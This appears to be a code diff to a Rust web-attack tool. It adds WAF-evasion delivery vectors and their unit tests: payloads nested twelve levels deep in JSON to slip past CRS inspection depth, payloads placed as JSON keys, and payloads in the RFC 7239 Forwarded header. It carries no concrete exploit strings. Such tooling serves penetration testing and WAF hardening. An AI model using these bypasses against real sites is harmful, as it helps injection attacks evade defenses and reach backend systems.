@@ -149,6 +149,18 @@ pub const VECTORS: &[Vector] = &[
     // JS cbor-x, Python cbor2, Java jackson-cbor) decodes it
     // server-side. We emit a minimal `{param: payload}` map.
     Vector { name: "POST-cbor", content_type: "application/cbor" },
+    // Deeply-nested JSON. CRS json-body recursion depth in the
+    // default `tx.json_request_body_processor` is bounded; the
+    // body parser stops descending at ~5-10 levels. We bury the
+    // payload at depth 12 so it sits PAST inspection while
+    // server-side parsers (Python json, Jackson, Go encoding/json,
+    // serde_json) descend freely.
+    Vector { name: "POST-json-deeply-nested", content_type: "application/json" },
+    // Payload as the JSON KEY, with a benign value. WAFs that
+    // inspect ARGS values miss key-positioned attacks; backends
+    // that iterate keys (route resolvers, dynamic-property setters,
+    // logger field-name handlers) flow the attack into a sink.
+    Vector { name: "POST-json-key-as-payload", content_type: "application/json" },
     // text/xml — CRS xml-body rules anchor on `application/xml`
     // ONLY in many profiles; `text/xml` is an RFC-7303-permitted
     // alternate MIME most XML parsers (libxml2, Xerces, JAXB,
@@ -200,6 +212,12 @@ pub const VECTORS: &[Vector] = &[
     // resolution, audit). WAFs that inspect Accept-Language do
     // so for bot-detection, not for SQL/XSS/cmdi patterns.
     Vector { name: "accept-language", content_type: "" },
+    // RFC 7239 `Forwarded:` header — XFF's official successor.
+    // Many WAFs and rule sets handle `X-Forwarded-For` but never
+    // had RFC-7239 plumbing wired in. Backends that read either
+    // (or honour Forwarded when present) flow the payload
+    // through.
+    Vector { name: "forwarded", content_type: "" },
     Vector { name: "x-forwarded-for", content_type: "" },
     Vector { name: "referer", content_type: "" },
 ];
@@ -559,6 +577,36 @@ fn build_request_for_vector(
             let body = encode_cbor_string_map(param, payload);
             Some(http.post(target).header("Content-Type", ct).body(body))
         }
+        "POST-json-deeply-nested" => {
+            // Bury the payload at depth 12 (one outer key, then
+            // 11 levels of single-key wrapping). CRS recursion
+            // typically stops at 5-10; the payload sits past it
+            // while serde_json / Jackson / encoding/json descend.
+            let depth: usize = 12;
+            let mut json = serde_json::json!({ param: payload });
+            for _ in 1..depth {
+                json = serde_json::json!({ "n": json });
+            }
+            Some(
+                http.post(target)
+                    .header("Content-Type", ct)
+                    .body(json.to_string()),
+            )
+        }
+        "POST-json-key-as-payload" => {
+            // The KEY carries the attack; the value is the
+            // operator's logical param (so a backend that reads
+            // the value still sees something contextual). Apps
+            // that iterate keys (route handlers, dynamic
+            // property setters, logger field names) hit the
+            // payload.
+            let body = format!(
+                "{{{}:\"{p}\"}}",
+                serde_json::Value::String(payload.to_string()),
+                p = param
+            );
+            Some(http.post(target).header("Content-Type", ct).body(body))
+        }
         "POST-text-xml" => {
             // Identical XML body shape to POST-xml; only the
             // declared Content-Type differs. text/xml vs
@@ -738,6 +786,17 @@ fn build_request_for_vector(
             // expansion / SQL select-language queries) flow the
             // attack through.
             Some(http.get(target).header("Accept-Language", payload))
+        }
+        "forwarded" => {
+            // RFC 7239 `Forwarded: for=<payload>` shape. Backends
+            // that honour Forwarded (incl. Spring Cloud Gateway,
+            // Apache mod_remoteip when configured, nginx
+            // ngx_http_realip_module's newer modes) read the
+            // `for=` parameter as the client IP.
+            Some(
+                http.get(target)
+                    .header("Forwarded", format!("for={payload}")),
+            )
         }
         "hpp" => {
             let url = format!(
@@ -3114,6 +3173,185 @@ mod tests {
     fn round_five_vectors_are_in_catalogue() {
         let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
         for required in ["x-original-url", "x-rewrite-url", "accept-language"] {
+            assert!(names.contains(required), "missing vector {required}");
+        }
+    }
+
+    // ── POST-json-deeply-nested ───────────────────────────────
+
+    #[test]
+    fn build_post_json_deeply_nested_buries_payload_at_depth_twelve() {
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-deeply-nested")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "PAYLOAD", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).unwrap();
+
+        // Walk 11 layers of "n" wrapping, then the innermost is
+        // {"q": "PAYLOAD"}.
+        let mut cur = &v;
+        for level in 0..11 {
+            cur = &cur["n"];
+            assert!(
+                cur.is_object(),
+                "level {level} should still be an object: {v}"
+            );
+        }
+        assert_eq!(cur["q"], "PAYLOAD");
+    }
+
+    #[test]
+    fn build_post_json_deeply_nested_is_valid_json() {
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-deeply-nested")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "abc", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let _: serde_json::Value = serde_json::from_str(s).expect("must be valid JSON");
+    }
+
+    #[test]
+    fn build_post_json_deeply_nested_emits_application_json() {
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-deeply-nested")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.headers().get("content-type").unwrap(), "application/json");
+    }
+
+    // ── POST-json-key-as-payload ──────────────────────────────
+
+    #[test]
+    fn build_post_json_key_as_payload_makes_payload_the_key() {
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-key-as-payload")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "param", "ATTACK", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).unwrap();
+        // The single key in the object IS the payload.
+        let obj = v.as_object().unwrap();
+        assert_eq!(obj.len(), 1);
+        let key = obj.keys().next().unwrap();
+        assert_eq!(key, "ATTACK");
+    }
+
+    #[test]
+    fn build_post_json_key_as_payload_value_is_the_param_name() {
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-key-as-payload")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "search", "EVIL", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).unwrap();
+        // The value of the key MUST be the param name, so a
+        // value-iterating backend sees something meaningful.
+        assert_eq!(v["EVIL"], "search");
+    }
+
+    #[test]
+    fn build_post_json_key_as_payload_handles_payload_with_quotes() {
+        // The payload becomes a JSON key — quotes / backslashes
+        // in it must be escaped or the JSON breaks.
+        let h = http();
+        let v = VECTORS
+            .iter()
+            .find(|v| v.name == "POST-json-key-as-payload")
+            .unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "param", "a\"b\\c", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let body = req.body().and_then(|b| b.as_bytes()).unwrap_or(b"");
+        let s = std::str::from_utf8(body).unwrap();
+        let v: serde_json::Value = serde_json::from_str(s).expect("must be valid JSON");
+        let obj = v.as_object().unwrap();
+        let key = obj.keys().next().unwrap();
+        assert_eq!(key, "a\"b\\c");
+    }
+
+    // ── forwarded (RFC 7239) ──────────────────────────────────
+
+    #[test]
+    fn build_forwarded_uses_rfc7239_for_equals_shape() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "forwarded").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "10.0.0.1", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        let hdr = req.headers().get("forwarded").unwrap().to_str().unwrap();
+        assert!(hdr.starts_with("for="), "must use RFC 7239 for= shape: {hdr}");
+        assert!(hdr.contains("10.0.0.1"));
+    }
+
+    #[test]
+    fn build_forwarded_uses_get_method() {
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "forwarded").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert_eq!(req.method(), "GET");
+    }
+
+    #[test]
+    fn build_forwarded_does_not_set_x_forwarded_for_header() {
+        // The 7239 header is distinct from XFF — confirm the
+        // builder doesn't accidentally set BOTH (which would
+        // give the WAF a chance to match on the well-known XFF
+        // header).
+        let h = http();
+        let v = VECTORS.iter().find(|v| v.name == "forwarded").unwrap();
+        let req = build_request_for_vector(v, &h, "http://x/", "q", "x", 0)
+            .unwrap()
+            .build()
+            .unwrap();
+        assert!(!req.headers().contains_key("x-forwarded-for"));
+        assert!(req.headers().contains_key("forwarded"));
+    }
+
+    // ── catalogue presence (round 6) ──────────────────────────
+
+    #[test]
+    fn round_six_vectors_are_in_catalogue() {
+        let names: std::collections::HashSet<&str> = VECTORS.iter().map(|v| v.name).collect();
+        for required in [
+            "POST-json-deeply-nested",
+            "POST-json-key-as-payload",
+            "forwarded",
+        ] {
             assert!(names.contains(required), "missing vector {required}");
         }
     }
